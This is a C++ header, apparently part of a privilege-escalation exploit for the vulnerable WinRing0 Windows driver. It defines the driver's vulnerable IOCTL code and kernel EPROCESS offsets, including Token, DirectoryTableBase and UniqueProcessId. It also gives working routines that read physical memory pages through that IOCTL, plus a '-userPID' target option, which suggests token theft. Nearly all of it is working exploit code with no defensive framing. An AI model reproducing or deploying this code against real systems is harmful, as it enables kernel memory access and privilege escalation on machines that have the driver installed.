#pragma once
#include <windows.h>
#include <TlHelp32.h> 
#include <cstdint>
#include <vector>
#include <map>
#include <iostream>

// #### CONSTANTS ####

#define VULN_IOCTL				(UINT64)0x9C406104
#define OUT_BUFF_SIZE			0x8
#define BUFF_SIZE				(UINT64)0x1000

enum OFFSET
{
	UNIQUEPROCESSID = 0x440,	// check if the values of these are != 0
	TOKEN = 0x4b8,
	DIRECTORY_TABLE = 0x28,		// just gonna assume this is 0x1ad000, because I don't have time
	IMAGEFILENAME = 0x5a8,
};
		
#define DEVICE_NAME		"\\\\.\\WinRing0_1_2_0"

#define putchar(c) putc((c),stdout)

#pragma pack (push, 1)

struct MapIoCmd {
	DWORD address;
	char pad[4];
	DWORD chunk_size;
	DWORD chunk_num;
	char pad2[0x100 - 0x10];
};
#pragma pack (pop)

HANDLE OpenDevice(const char* device_symbolic_link)
{
	HANDLE device_handle = INVALID_HANDLE_VALUE;

	device_handle = CreateFileA(device_symbolic_link,               // Device to open
		GENERIC_READ | GENERIC_WRITE,								// Request R/W access
		FILE_SHARE_READ | FILE_SHARE_WRITE,							// Allow other processes to R/W
		NULL,														// Default security attributes
		OPEN_EXISTING,												// Default disposition
		0,															// No flags/attributes
		NULL);														// Don't copy attributes

	if (device_handle == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open device!\n");
	}

	return device_handle;
}

uint8_t* MapPage(HANDLE device, DWORD address)
{
	DWORD dwDataSizeToRead = 0x4; // Size of data to read (in chunks), in bytes (1, 2, 4); 1 = movsb (BYTE), 2 = movsw (WORD), 4 = movsd (DWORD)
	DWORD dwAmountOfDataToRead = 8; // Amount of data (in chunks) to read
	DWORD dwBytesReturned = 0; // number of bytes returned from the DeviceIoControl request

	// allocate memory for the DeviceIoControl lpInBuffer & lpOutBuffer buffers
	auto lpInBuffer = new MapIoCmd;
	uint8_t* lpOutBuffer = new uint8_t[0x100];
	auto thepage = new uint8_t[0x1000];


	for (uint32_t offset = 0; offset < 0x1000; offset += 32)
	{
		lpInBuffer->address = address + offset;

		lpInBuffer->chunk_size = dwDataSizeToRead;
		lpInBuffer->chunk_num = dwAmountOfDataToRead;

		bool success = DeviceIoControl(
			device,
			VULN_IOCTL,
			lpInBuffer,
			0x10,
			lpOutBuffer,
			0x40,
			&dwBytesReturned,
			nullptr);


		if (!success)
		{
			// memset(thepage + offset, 0x00, 32);
			continue;
		}
		else
		{
			memcpy(thepage + offset, lpOutBuffer, 32);
			//std::cout << "MAPPING SUCCESS \n";
		}
	}

	delete lpInBuffer;

	return thepage;
}

uint8_t* MapMemory(HANDLE device, DWORD address)
{
    DWORD dwDataSizeToRead = 0x4; // Size of data to read (in chunks), in bytes (1, 2, 4); 1 = movsb (BYTE), 2 = movsw (WORD), 4 = movsd (DWORD)
    DWORD dwAmountOfDataToRead = 8; // Amount of data (in chunks) to read
    DWORD dwBytesReturned = 0; // number of bytes returned from the DeviceIoControl request

    // allocate memory for the DeviceIoControl lpInBuffer & lpOutBuffer buffers
	auto lpInBuffer = new MapIoCmd;
	uint8_t* lpOutBuffer = new uint8_t[0x100];

    if (lpInBuffer == NULL || lpOutBuffer == NULL)
    {
        std::cout << "[!] Unable to allocate buffers' memory area. Error code: " << ::GetLastError() << std::endl;
        return NULL;
    }

	lpInBuffer->address = address;
	
	lpInBuffer->chunk_size = dwDataSizeToRead;
	lpInBuffer->chunk_num = dwAmountOfDataToRead;

    bool success = DeviceIoControl(
        device,
		VULN_IOCTL,
        lpInBuffer, 
        0x10,
        lpOutBuffer, 
        0x40,
        &dwBytesReturned,
        nullptr);

    if (!success)
    {
       // std::cout << "[!] Couldn't send IOCTL 0x" << std::hex << VULN_IOCTL
        //    << " Error code: 0x" << std::hex << ::GetLastError() << std::endl;


		// std::cout << "address was 0x" << std::hex << lpInBuffer->address << "\n";
        return NULL;
    }
	else
	{
		std::cout << "MAPPING SUCCESS \n";
	}

	delete lpInBuffer;
	return lpOutBuffer;
}

// ### OPTIONS PARSING ###

DWORDLONG get_user_pid_opt(int argc, char** argv)
{
	for (int i = 0; i < argc; i++)
	{
		if (strcmp(argv[i], "-userPID") == 0 && i + 1 < argc)
		{
			return atoi(argv[i + 1]);
		}
	}
	return NULL;
}

DWORDLONG get_help_opt(int argc, char** argv)
{
	for (int i = 0; i < argc; i++)
	{
		if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "-help") == 0 || strcmp(argv[i], "--help") == 0)
		{
			return 1;
		}
	}
	return NULL;
}